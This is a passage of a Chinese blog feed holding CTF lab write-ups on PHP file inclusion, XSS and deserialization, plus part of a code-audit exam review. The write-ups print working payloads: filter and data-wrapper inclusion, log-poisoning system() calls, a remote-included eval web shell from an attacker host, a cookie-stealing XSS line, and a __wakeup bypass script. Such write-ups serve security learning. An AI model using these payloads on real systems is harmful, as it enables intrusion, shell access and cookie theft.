title="第6题"></a>第6题</h2><p>变量覆盖常用函数或方式：</p><ol><li>register_global注册开关</li><li>extract()</li><li>$$符号（可变变量）</li><li>import_request_variables()</li><li>parse_str()<br><a href="https://y4er.com/posts/variable-coverage/#import_request_variables">变量覆盖</a></li></ol><h2 id="第7题-1"><a href="#第7题-1" class="headerlink" title="第7题"></a>第7题</h2><p>王小云对MD5算法的碰撞问题研究方面做出了贡献。</p><h2 id="第8题-1"><a href="#第8题-1" class="headerlink" title="第8题"></a>第8题</h2><p>A选项设计思路不可行</p><h2 id="第9题-1"><a href="#第9题-1" class="headerlink" title="第9题"></a>第9题</h2><p>为了防止客户端可修改价格，那么单价和总价不可从客户端获取<br>为了防止数量出现漏洞，需要验证购买数量不能小于等于0<br>为了防止利用时间差多次购买，进行账户支付锁定机制</p><h2 id="第10题-1"><a href="#第10题-1" class="headerlink" title="第10题"></a>第10题</h2><p>一个文件管理功能为了保证安全，在满足业务需求的情况下，设计的时候应该遵循以下几个点：</p><ol><li>禁止写入脚本可在服务器端执行的文件</li><li>限制文件管理功能操作的目录</li><li>限制文件管理功能访问权限</li><li>禁止上传特殊字符文件名的文件</li></ol><h2 id="第11题-1"><a href="#第11题-1" class="headerlink" title="第11题"></a>第11题</h2><p>通常文件和数据库备份功能容易出现的安全问题包括：</p><ol><li>备份文件名可预测</li><li>未授权访问和越权访问</li><li>可以直接执行SQL语句进行操作</li></ol><h2 id="第12题-1"><a href="#第12题-1" class="headerlink" title="第12题"></a>第12题</h2><p>密码策略应当遵守的原则：</p><ol><li>禁止使用弱口令</li><li>禁止用户名和密码相同</li><li>强制密码使用8位以上的“大小写字母+数字+特殊字符”的组合</li></ol><h2 id="第13题-1"><a href="#第13题-1" class="headerlink" title="第13题"></a>第13题</h2><p>双因素认证是一种采用时间同步技术的系统，每次产生的动态密码不同。<br>独立密码是区别于登陆密码的二次加密保护，大多时候不能进行登录保护<br>实现登录保护的策略：双因素认证，动态令牌，限制登录IP</p><h2 id="第14题-1"><a href="#第14题-1" class="headerlink" title="第14题"></a>第14题</h2>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;考试即将到来，复习刻不容缓。复习题由某群友整理得到。&lt;/p&gt;</summary>
    
    
    
    <category term="代码审计" scheme="http://example.com/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    <category term="期末专题" scheme="http://example.com/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E6%9C%9F%E6%9C%AB%E4%B8%93%E9%A2%98/"/>
    
    
    <category term="代码审计" scheme="http://example.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    <category term="期末" scheme="http://example.com/tags/%E6%9C%9F%E6%9C%AB/"/>
    
  </entry>
  
  <entry>
    <title>ctfshow-web入门-文件包含</title>
    <link href="http://example.com/2022/12/31/ctfshow-web%E5%85%A5%E9%97%A8-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
    <id>http://example.com/2022/12/31/ctfshow-web%E5%85%A5%E9%97%A8-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</id>
    <published>2022-12-30T16:00:00.000Z</published>
    <updated>2022-12-31T09:50:43.065Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>文件包含不够熟练，需要增加熟练度。</p><span id="more"></span><h1 id="web78"><a href="#web78" class="headerlink" title="web78"></a>web78</h1><ol><li><p>查看源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过GET方式传入参数file，如果变量file不为空，则通过include函数进行文件包含。</p></li><li><p>构造payload<br>通过php伪协议构造payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=php://filter/convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure><p>成功拿到flag</p></li></ol><h1 id="web79"><a href="#web79" class="headerlink" title="web79"></a>web79</h1><ol><li><p>查看源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过GET方式传入参数file，如果变量不为空，并且其中不含php，则通过include函数包含文件。</p></li><li><p>构造payload<br>由于不能包含php，所以不能使用php伪协议，改为用data伪协议绕过。<br>通过shell_code命令执行(``)读取flag.php的内容<br>或者用base64加密可以使用php<br>构造payload如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=data:text/plain,&lt;?= `tac f*`;?&gt;</span><br></pre></td></tr></table></figure><p>成功拿到flag</p></li></ol><h1 id="web80"><a href="#web80" class="headerlink" title="web80"></a>web80</h1><ol><li>查看源码<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;data&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><ul><li>目录地址<br>日志地址通常为<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/var/log/nginx/error.log</span><br><span class="line">/var/log/nginx/access.log</span><br><span class="line">一般apache日志在类似目录下(/var/log/httpd/access.log)</span><br></pre></td></tr></table></figure>根据官方的Hint，可以尝试访问：<br><code>http://url/?file=/var/log/nginx/access.log</code><br>通过burp抓包可以得到user-agent和Referer字段，由此我们可以尝试在User-agent或Referer处注入命令执行代码</li></ul><ol start="2"><li>构造payload<br>首先注入能显示文件的代码<br><code>&lt;?php echo system(&#39;ls&#39;);?&gt;</code><br>发现flag文件为fl0g.php后，执行显示的代码：<br><code>&lt;?php echo system(&#39;cat fl0g.php&#39;);?&gt;</code></li></ol><p>或者采用另一种方法：<br>远程文件包含<br>xxx为自己服务器地址</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?file=http://xxxx/shell.txt</span><br><span class="line">shell.txt中内容</span><br><span class="line">&lt;?php eval($_POST[1]);?&gt;</span><br></pre></td></tr></table></figure><p>成功拿到flag</p><h1 id="web81"><a href="#web81" class="headerlink" title="web81"></a>web81</h1><p>方式同上</p><h1 id="web82"><a href="#web82" class="headerlink" title="web82"></a>web82</h1><h1 id="web87"><a href="#web87" class="headerlink" title="web87"></a>web87</h1><ol><li>查看源码<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$content</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;content&#x27;</span>];</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;data&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;:&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;.&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="title function_ invoke__">file_put_contents</span>(<span class="title function_ invoke__">urldecode</span>(<span class="variable">$file</span>), <span class="string">&quot;&lt;?php die(&#x27;大佬别秀了&#x27;);?&gt;&quot;</span>.<span class="variable">$content</span>);</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><ul><li>php:&#x2F;&#x2F;filter的妙用<br><a href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html">php:&#x2F;&#x2F;filter的妙用</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;文件包含不够熟练，需要增加熟练度。&lt;/p&gt;</summary>
    
    
    
    <category term="CTF" scheme="http://example.com/categories/CTF/"/>
    
    <category term="文件包含" scheme="http://example.com/categories/CTF/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
    
    
    <category term="CTF" scheme="http://example.com/tags/CTF/"/>
    
    <category term="文件包含" scheme="http://example.com/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
    
  </entry>
  
  <entry>
    <title>ctfshow-web入门-XSS</title>
    <link href="http://example.com/2022/12/29/ctfshow-web%E5%85%A5%E9%97%A8-XSS/"/>
    <id>http://example.com/2022/12/29/ctfshow-web%E5%85%A5%E9%97%A8-XSS/</id>
    <published>2022-12-28T16:00:00.000Z</published>
    <updated>2022-12-30T06:21:53.092Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>由于某些原因，想训练让印象更深刻，就不以拿到flag为目的，选择手写弹窗了。<br>如果想拿flag，需要在相应环境下使用类似于以下的语句：<br><code>&lt;body onload=&quot;window.open(&#39;http://IP/&#39;+document.cookie)&quot;&gt;</code></p><span id="more"></span><h1 id="web316"><a href="#web316" class="headerlink" title="web316"></a>web316</h1><p>几乎没有任何限制，直接<br><code>&lt;script&gt;alert(0)&lt;/alert&gt;</code><br>或者使用img标签<br><code>&lt;img src=1 onerror=alert(0)&gt;</code><br>或者使用body标签：<br><code>&lt;body onload=&quot;alert(0)&quot;&gt;</code><br>或者使用svg标签：<br><code>&lt;svg onload=&quot;alert(0)&quot;&gt;</code><br>或者使用input标签：<br><code>&lt;input onfocus=&quot;alert(0)&quot; autofocus&gt;</code><br>或者使用video标签：<br><code>&lt;video onloadstart=&quot;alert(0)&quot; src=1 /&gt;</code><br>或者使用style标签：<br><code>&lt;style οnlοad=alert(1)&gt;&lt;/style&gt;</code><br>或者使用iframe标签：<br><code>&lt;iframe onload=&quot;alert(0)&quot;&gt;</code></p><h1 id="web317"><a href="#web317" class="headerlink" title="web317"></a>web317</h1><p>过滤了script标签</p><h1 id="web318"><a href="#web318" class="headerlink" title="web318"></a>web318</h1><p>增加过滤了a标签和img标签</p><h1 id="web319"><a href="#web319" class="headerlink" title="web319"></a>web319</h1><p>增加过滤了style标签</p><h1 id="web320"><a href="#web320" class="headerlink" title="web320"></a>web320</h1><p>除了以上的过滤之外，还对video也对空格进行了过滤，使用 <code>/</code> 代替空格绕过即可，比如：<br><code>&lt;iframe/onload=&quot;alert(0)&quot;&gt;</code><br><code>&lt;input/onfocus=&quot;alert(0)&quot;/autofocus&gt;</code><br><code>&lt;body/onload=&quot;alert(0)&quot;&gt;</code></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;由于某些原因，想训练让印象更深刻，就不以拿到flag为目的，选择手写弹窗了。&lt;br&gt;如果想拿flag，需要在相应环境下使用类似于以下的语句：&lt;br&gt;&lt;code&gt;&amp;lt;body onload=&amp;quot;window.open(&amp;#39;http://IP/&amp;#39;+document.cookie)&amp;quot;&amp;gt;&lt;/code&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="CTF" scheme="http://example.com/categories/CTF/"/>
    
    <category term="XSS" scheme="http://example.com/categories/CTF/XSS/"/>
    
    
    <category term="CTF" scheme="http://example.com/tags/CTF/"/>
    
    <category term="XSS" scheme="http://example.com/tags/XSS/"/>
    
  </entry>
  
  <entry>
    <title>攻防世界-Web_php_unserialize</title>
    <link href="http://example.com/2022/12/28/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-Web_php_unserialize/"/>
    <id>http://example.com/2022/12/28/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-Web_php_unserialize/</id>
    <published>2022-12-27T16:00:00.000Z</published>
    <updated>2022-12-28T15:27:26.329Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>没注意到细节会吃亏。</p><span id="more"></span><h1 id="查看源码"><a href="#查看源码" class="headerlink" title="查看源码"></a>查看源码</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Demo</span> </span>&#123; </span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$file</span> = <span class="string">&#x27;index.php&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span></span>) </span>&#123; </span><br><span class="line">        <span class="variable language_">$this</span>-&gt;file = <span class="variable">$file</span>; </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">        <span class="keyword">echo</span> @<span class="title function_ invoke__">highlight_file</span>(<span class="variable">$this</span>-&gt;file, <span class="literal">true</span>); </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;file != <span class="string">&#x27;index.php&#x27;</span>) &#123; </span><br><span class="line">            <span class="comment">//the secret is in the fl4g.php</span></span><br><span class="line">            <span class="variable language_">$this</span>-&gt;file = <span class="string">&#x27;index.php&#x27;</span>; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;var&#x27;</span>])) &#123; </span><br><span class="line">    <span class="variable">$var</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;var&#x27;</span>]); </span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[oc]:\d+:/i&#x27;</span>, <span class="variable">$var</span>)) &#123; </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;stop hacking!&#x27;</span>); </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        @<span class="title function_ invoke__">unserialize</span>(<span class="variable">$var</span>); </span><br><span class="line">    &#125; </span><br><span class="line">&#125; <span class="keyword">else</span> &#123; </span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="string">&quot;index.php&quot;</span>); </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>由源码可知需要绕过魔法函数 <code>__wakeup()</code> ，只需要变量参数数量大于实际数量就可以了。<br>preg_match()函数那里直接用加号绕过，比如: <code>O:4</code> 改为 <code>O:+4</code><br>还需要进行base64加密，需要在脚本中加密才行。<br>因为这里有个坑，这里的 file 变量为私有变量，所以序列化之后的字符串开头结尾各有一个空白字符（即%00），字符串长度也比实际长度大 2，如果将序列化结果复制到在线的 base64 网站进行编码可能就会丢掉空白字符，所以这里直接在php 代码里进行编码。类似的还有 protected 类型的变量，序列化之后字符串首部会加上%00*%00</p><h1 id="构造payload"><a href="#构造payload" class="headerlink" title="构造payload"></a>构造payload</h1><p>先根据源码写一个简洁脚本：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Demo</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$file</span> = <span class="string">&#x27;index.php&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;file = <span class="variable">$file</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> @<span class="title function_ invoke__">highlight_file</span>(<span class="variable">$this</span>-&gt;file, <span class="literal">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Demo</span>(<span class="string">&#x27;fl4g.php&#x27;</span>);</span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$C</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;O:4&#x27;</span>,<span class="string">&#x27;O:+4&#x27;</span>,<span class="variable">$b</span>);      <span class="comment">//绕过正则表达式过滤</span></span><br><span class="line"><span class="variable">$C</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;:1:&#x27;</span>,<span class="string">&#x27;:2:&#x27;</span>,<span class="variable">$C</span>); <span class="comment">//wakeup绕过</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$C</span>);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">base64_encode</span>(<span class="variable">$C</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>得到的base64编码构造payload即可：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?var=TzorNDoiRGVtbyI6Mjp7czoxMDoiAERlbW8AZmlsZSI7czo4OiJmbDRnLnBocCI7fQ==</span><br></pre></td></tr></table></figure><p>成功拿到flag</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;没注意到细节会吃亏。&lt;/p&gt;</summary>
    
    
    
    <category term="CTF" scheme="http://example.com/categories/CTF/"/>
    
    <category term="反序列化" scheme="http://example.com/categories/CTF/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
    
    <category term="CTF" scheme="http://example.com/tags/CTF/"/>
    
    <category term="反序列化" scheme="http://example.com/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>ctfshow-web入门-反序列化</title>
    <link href="http://example.com/2022/12/27/ctfshow-web%E5%85%A5%E9%97%A8-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <id>http://example.com/2022/12/27/ctfshow-web%E5%85%A5%E9%97%A8-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</id>
    <published>2022-12-26T16:00:00.000Z</published>
    <updated>2022-12-29T13:01:52.087Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>开始刷反序列化的题咯~</p><span id="more"></span><h1 id="web254"><a href="#web254" class="headerlink" title="web254"></a>web254</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$isVip</span>=<span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">checkVip</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;isVip;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"><span class="variable">$u</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;username===<span class="variable">$u</span>&amp;&amp;<span class="variable language_">$this</span>-&gt;password===<span class="variable">$p</span>)&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;isVip=<span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;isVip;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">vipOneKeyGetFlag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;isVip)&#123;</span><br><span class="line">            <span class="keyword">global</span> <span class="variable">$flag</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;your flag is &quot;</span>.<span class="variable">$flag</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;no vip, no flag&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$username</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="variable">$password</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$username</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$password</span>))&#123;</span><br><span class="line">    <span class="variable">$user</span> = <span class="keyword">new</span> <span class="title function_ invoke__">ctfShowUser</span>();</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$user</span>-&gt;<span class="title function_ invoke__">login</span>(<span class="variable">$username</span>,<span class="variable">$password</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$user</span>-&gt;<span class="title function_ invoke__">checkVip</span>())&#123;</span><br><span class="line">            <span class="variable">$user</span>-&gt;<span class="title function_ invoke__">vipOneKeyGetFlag</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;no vip,no flag&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol><li><p>查看源码<br>通过GET传入两个参数username和password,检查参数是否为空后，将参数传入login函数中比较与ctfShowUser类里定义的username和password是否相等，如果相等则能显示flag，否则不能。</p></li><li><p>构造payload<br>本题与反序列化关联不大，就是绕了个圈子作比较罢了。以下是payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?username=xxxxxx&amp;password=xxxxxx</span><br></pre></td></tr></table></figure></li></ol><h1 id="web255"><a href="#web255" class="headerlink" title="web255"></a>web255</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span 